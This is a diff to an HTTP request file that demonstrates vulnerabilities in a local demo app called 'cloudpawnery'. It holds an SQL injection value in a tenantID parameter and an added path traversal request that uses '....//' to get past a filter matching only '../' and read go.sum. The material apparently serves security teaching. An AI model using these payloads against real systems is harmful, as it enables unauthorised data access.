@@ -104,3 +104,22 @@ Content-Type: application/json
 GET http://localhost:6000/cloudpawnery/image
     ?tenantID=3971533981712' OR tenant_id='432423
 Content-Type: application/json
+
+
+## Vulnerability demo: Path Traversal example
+
+### ✅ All Systems Go
+
+GET http://localhost:4002/cloudpawnery/download
+    ?filename=john-smith-profile.jpg
+Content-Type: application/json
+
+### ❌ Careful Now: Path Traversal example
+
+#### We circumvent the exact string match of '../' by doing this:
+
+GET http://localhost:4002/cloudpawnery/download
+    ?filename=....//go.sum
+Content-Type: application/json
+
+{}
